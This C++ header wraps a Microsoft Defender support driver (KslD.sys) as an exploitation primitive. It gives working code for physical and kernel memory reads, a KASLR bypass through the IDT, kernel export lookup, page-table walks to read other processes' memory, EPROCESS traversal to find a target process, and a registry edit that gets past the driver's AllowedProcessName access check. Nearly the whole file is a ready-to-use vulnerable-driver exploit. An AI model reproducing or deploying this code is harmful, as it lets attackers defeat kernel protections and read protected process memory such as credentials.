#pragma once
// KslD.sys IOCTL wrapper -- Microsoft Defender support driver (read-only)
//
// Device:      \\.\KslD
// IOCTL:       0x222044 (single code, sub-command multiplexed)
// Primitives:  Physical read (sub-cmd 12 mode=1)
//              Kernel virtual read (sub-cmd 12 mode=2)
//              CPU register dump / KASLR bypass (sub-cmd 2)
// Limitation:  NO write primitive. Read-only driver.
//
// For cross-process reads: phys_read + page-table walk (CR3 from EPROCESS+0x28)
// Access gate:  AllowedProcessName registry value (trivially admin-editable)
// Vulnerable version SHA256: bd17231833aa369b3b2b6963899bf05dbefd673db270aec15446f2fab4a17b5a

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <algorithm>
#include <optional>

namespace ksld {

constexpr DWORD  KSLD_IOCTL     = 0x222044;
constexpr uint64_t PFN_MASK     = 0xFFFFFFFFF000ULL;

#pragma pack(push, 1)
struct IoReadInput {
    uint32_t sub_cmd;
    uint32_t reserved;
    uint64_t address;
    uint64_t size;
    uint32_t mode;       // 1 = physical, 2 = virtual (kernel VA only)
    uint32_t padding;
};

struct IoSubCmd2 {
    uint32_t sub_cmd;    // = 2
    uint32_t reserved;   // = 0
};
#pragma pack(pop)

// Sub-cmd 2 output: array of 16-byte register entries
struct RegEntry {
    char     name[8];
    uint64_t value;
};

class Driver {
    HANDLE m_dev = INVALID_HANDLE_VALUE;

public:
    Driver() = default;
    ~Driver() { Close(); }
    Driver(const Driver&) = delete;
    Driver& operator=(const Driver&) = delete;

    // ── Device management ──────────────────────────────────

    bool Open() {
        m_dev = CreateFileW(L"\\\\.\\KslD",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, 0, nullptr);
        return m_dev != INVALID_HANDLE_VALUE;
    }

    void Close() {
        if (m_dev != INVALID_HANDLE_VALUE) {
            CloseHandle(m_dev);
            m_dev = INVALID_HANDLE_VALUE;
        }
    }

    bool Valid() const { return m_dev != INVALID_HANDLE_VALUE; }
    HANDLE Handle() const { return m_dev; }

    // ── Raw IOCTL ──────────────────────────────────────────

    bool Ioctl(const void* in_buf, DWORD in_size,
               void* out_buf, DWORD out_size, DWORD* bytes_ret) const
    {
        DWORD br = 0;
        BOOL ok = DeviceIoControl(m_dev, KSLD_IOCTL,
            const_cast<void*>(in_buf), in_size,
            out_buf, out_size, &br, nullptr);
        if (bytes_ret) *bytes_ret = br;
        return ok && br > 0;
    }

    // ── Sub-command 2: CPU register dump (KASLR bypass) ────

    // Returns CR3 value from the register dump.
    // Also populates idtr_out if non-null.
    bool GetCpuRegisters(uint64_t* cr3_out, uint64_t* idtr_out = nullptr) const {
        IoSubCmd2 cmd{ 2, 0 };
        uint8_t buf[512]{};
        DWORD br = 0;
        if (!Ioctl(&cmd, sizeof(cmd), buf, sizeof(buf), &br))
            return false;

        for (DWORD off = 0; off + 15 < br; off += 16) {
            auto* entry = reinterpret_cast<RegEntry*>(buf + off);
            if (cr3_out && memcmp(entry->name, "cr3", 3) == 0)
                *cr3_out = entry->value;
            if (idtr_out && memcmp(entry->name, "idtr", 4) == 0)
                *idtr_out = entry->value;
        }
        return true;
    }

    // ── Sub-command 12: Physical memory read ───────────────

    bool ReadPhysical(uint64_t pa, void* buf, size_t size) const {
        IoReadInput req{ 12, 0, pa, size, 1, 0 };
        DWORD br = 0;
        return Ioctl(&req, sizeof(req), buf, static_cast<DWORD>(size), &br)
            && br >= size;
    }

    // ── Sub-command 12: Kernel virtual address read ────────
    // Only works for kernel-space VAs (above 0xFFFF800000000000).
    // Does NOT read user-mode process virtual memory.

    bool ReadKernelVA(uint64_t kva, void* buf, size_t size) const {
        if (size <= 0x400) {
            IoReadInput req{ 12, 0, kva, size, 2, 0 };
            DWORD br = 0;
            return Ioctl(&req, sizeof(req), buf, static_cast<DWORD>(size), &br)
                && br >= size;
        }
        auto* dst = static_cast<uint8_t*>(buf);
        for (size_t off = 0; off < size; ) {
            size_t chunk = (std::min<size_t>)(0x400, size - off);
            if (!ReadKernelVA(kva + off, dst + off, chunk))
                return false;
            off += chunk;
        }
        return true;
    }

    // ── KASLR bypass: IDTR -> IDT -> ISR scan -> ntoskrnl base ──

    uint64_t FindKernelBase() const {
        uint64_t idtr = 0;
        if (!GetCpuRegisters(nullptr, &idtr) || !idtr)
            return 0;

        uint8_t idt[256]{};
        if (!ReadKernelVA(idtr, idt, sizeof(idt)))
            return 0;

        uint64_t min_isr = UINT64_MAX;
        for (int i = 0; i < 16; i++) {
            auto* e = idt + i * 16;
            uint64_t isr = 0;
            memcpy(&isr, e, 2);                            // low word
            uint16_t mid; memcpy(&mid, e + 6, 2);
            isr |= static_cast<uint64_t>(mid) << 16;
            uint32_t hi; memcpy(&hi, e + 8, 4);
            isr |= static_cast<uint64_t>(hi) << 32;

            if (isr > 0xFFFF000000000000ULL && isr < min_isr)
                min_isr = isr;
        }
        if (min_isr == UINT64_MAX) return 0;

        uint64_t base = min_isr & ~0xFFFULL;
        for (int i = 0; i < 4096; i++) {
            uint8_t mz[2]{};
            if (ReadKernelVA(base - i * 0x1000, mz, 2) && mz[0] == 'M' && mz[1] == 'Z')
                return base - i * 0x1000;
        }
        return 0;
    }

    // ── PE export resolution (kernel VA) ───────────────────

    uint64_t FindExport(uint64_t module_base, const char* name) const {
        uint8_t hdr[0x1000]{};
        if (!ReadKernelVA(module_base, hdr, sizeof(hdr)))
            return 0;

        uint32_t pe_off;
        memcpy(&pe_off, hdr + 0x3C, 4);
        uint32_t exp_rva, exp_sz;
        memcpy(&exp_rva, hdr + pe_off + 0x88, 4);
        memcpy(&exp_sz,  hdr + pe_off + 0x8C, 4);
        if (!exp_rva) return 0;

        auto exp = std::make_unique<uint8_t[]>(exp_sz);
        if (!ReadKernelVA(module_base + exp_rva, exp.get(), exp_sz))
            return 0;

        uint32_t n_names, a_rva, n_rva, o_rva;
        memcpy(&n_names, exp.get() + 0x18, 4);
        memcpy(&a_rva,   exp.get() + 0x1C, 4); a_rva -= exp_rva;
        memcpy(&n_rva,   exp.get() + 0x20, 4); n_rva -= exp_rva;
        memcpy(&o_rva,   exp.get() + 0x24, 4); o_rva -= exp_rva;

        size_t name_len = strlen(name);
        for (uint32_t i = 0; i < n_names; i++) {
            uint32_t nr;
            memcpy(&nr, exp.get() + n_rva + i * 4, 4);
            nr -= exp_rva;
            if (nr + name_len >= exp_sz) continue;
            if (memcmp(exp.get() + nr, name, name_len) == 0 && exp[nr + name_len] == 0) {
                uint16_t ordinal;
                memcpy(&ordinal, exp.get() + o_rva + i * 2, 2);
                uint32_t func_rva;
                memcpy(&func_rva, exp.get() + a_rva + ordinal * 4, 4);
                return module_base + func_rva;
            }
        }
        return 0;
    }

    // ── Page-table walk: VA -> PA via DTB ──────────────────

    std::optional<uint64_t> TranslateVA(uint64_t dtb, uint64_t va) const {
        uint64_t table = dtb & PFN_MASK;

        struct Level { int shift; uint64_t large_mask; bool can_be_large; };
        constexpr Level levels[] = {
            { 39, 0,                  false },  // PML4
            { 30, 0xFFFFC0000000ULL,  true  },  // PDPT (1GB)
            { 21, 0xFFFFFFFE00000ULL, true  },  // PD   (2MB)
        };

        for (auto& lvl : levels) {
            size_t idx = (va >> lvl.shift) & 0x1FF;
            uint64_t entry = 0;
            if (!ReadPhysical(table + idx * 8, &entry, 8))
                return std::nullopt;
            if (!(entry & 1)) return std::nullopt;
            if (lvl.can_be_large && (entry & 0x80))
                return (entry & lvl.large_mask) | (va & ((1ULL << lvl.shift) - 1));
            table = entry & PFN_MASK;
        }

        // PT level
        size_t idx = (va >> 12) & 0x1FF;
        uint64_t entry = 0;
        if (!ReadPhysical(table + idx * 8, &entry, 8))
            return std::nullopt;

        if (entry & 1)
            return (entry & PFN_MASK) | (va & 0xFFF);

        // Transition page (standby list)
        if (entry & 0x800) {
            constexpr uint64_t masks[] = { 0xFFFFFF000ULL, 0xFFFFFFF000ULL, 0xFFFFFFFF000ULL, PFN_MASK };
            for (auto mask : masks) {
                uint64_t pa = (entry & mask) | (va & 0xFFF);
                uint8_t test[16]{};
                if (ReadPhysical(pa & ~0xFFFULL, test, 16)) {
                    bool all_zero = true;
                    for (int i = 0; i < 16; i++) if (test[i]) { all_zero = false; break; }
                    if (!all_zero) return pa;
                }
            }
            return (entry & 0xFFFFFF000ULL) | (va & 0xFFF);
        }

        return std::nullopt;
    }

    // ── Cross-process virtual memory read ──────────────────
    // dtb = target process DirectoryTableBase (EPROCESS+0x28)

    bool ReadProcessMemory(uint64_t dtb, uint64_t va, void* buf, size_t size) const {
        auto* dst = static_cast<uint8_t*>(buf);
        size_t off = 0;
        while (off < size) {
            uint64_t page_off = (va + off) & 0xFFF;
            size_t chunk = (std::min<size_t>)(size - off, 0x1000 - page_off);

            auto pa = TranslateVA(dtb, va + off);
            if (!pa.has_value()) {
                memset(dst + off, 0, chunk);
            } else {
                if (!ReadPhysical(*pa, dst + off, chunk))
                    memset(dst + off, 0, chunk);
            }
            off += chunk;
        }
        return true;
    }

    // ── EPROCESS walk: find process by PID ─────────────────
    // Returns { eprocess_va, dtb } or { 0, 0 } on failure.

    struct ProcessInfo {
        uint64_t eprocess;
        uint64_t dtb;
    };

    ProcessInfo FindProcess(uint64_t ntos_base, DWORD target_pid) const {
        uint64_t psip_va = FindExport(ntos_base, "PsInitialSystemProcess");
        if (!psip_va) return { 0, 0 };

        uint64_t sys_ep = 0;
        if (!ReadKernelVA(psip_va, &sys_ep, 8) || !sys_ep)
            return { 0, 0 };

        // Auto-detect EPROCESS offsets from SYSTEM (PID=4)
        uint8_t ep_data[0x800]{};
        if (!ReadKernelVA(sys_ep, ep_data, sizeof(ep_data)))
            return { 0, 0 };

        uint32_t off_pid = 0, off_links = 0, off_name = 0;
        for (uint32_t o = 0x100; o < 0x600; o += 8) {
            uint64_t val;
            memcpy(&val, ep_data + o, 8);
            if (val == 4) {
                uint64_t nxt;
                memcpy(&nxt, ep_data + o + 8, 8);
                if (nxt > 0xFFFF000000000000ULL) {
                    off_pid = o;
                    off_links = o + 8;
                    break;
                }
            }
        }
        for (uint32_t o = 0x200; o < 0x700; o++) {
            if (memcmp(ep_data + o, "System\0", 7) == 0) {
                off_name = o;
                break;
            }
        }
        if (!off_pid) return { 0, 0 };

        // Walk ActiveProcessLinks
        uint64_t head = sys_ep + off_links;
        uint64_t cur = 0;
        memcpy(&cur, ep_data + off_links, 8);

        for (int i = 0; i < 500 && cur && cur != head; i++) {
            uint64_t ep = cur - off_links;
            uint64_t pid = 0;
            if (!ReadKernelVA(ep + off_pid, &pid, 8)) break;

            if (static_cast<DWORD>(pid) == target_pid) {
                uint64_t dtb = 0;
                ReadKernelVA(ep + 0x28, &dtb, 8);
                return { ep, dtb };
            }

            uint64_t next = 0;
            if (!ReadKernelVA(cur, &next, 8)) break;
            cur = next;
        }
        return { 0, 0 };
    }

    // ── Convenience: read a T from process memory ──────────

    template<typename T>
    T ReadProc(uint64_t dtb, uint64_t va) const {
        T val{};
        ReadProcessMemory(dtb, va, &val, sizeof(T));
        return val;
    }
};

// ── AllowedProcessName registry bypass helper ──────────

inline bool SetAllowedProcess() {
    wchar_t exe_path[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

    wchar_t vol_name[MAX_PATH]{};
    wchar_t drive[3] = { exe_path[0], exe_path[1], 0 };
    QueryDosDeviceW(drive, vol_name, MAX_PATH);

    std::wstring nt_path = std::wstring(vol_name) + (exe_path + 2);

    HKEY hk = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services\\KslD",
            0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
        return false;

    LSTATUS st = RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(nt_path.c_str()),
        static_cast<DWORD>((nt_path.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    return st == ERROR_SUCCESS;
}

} // namespace ksld
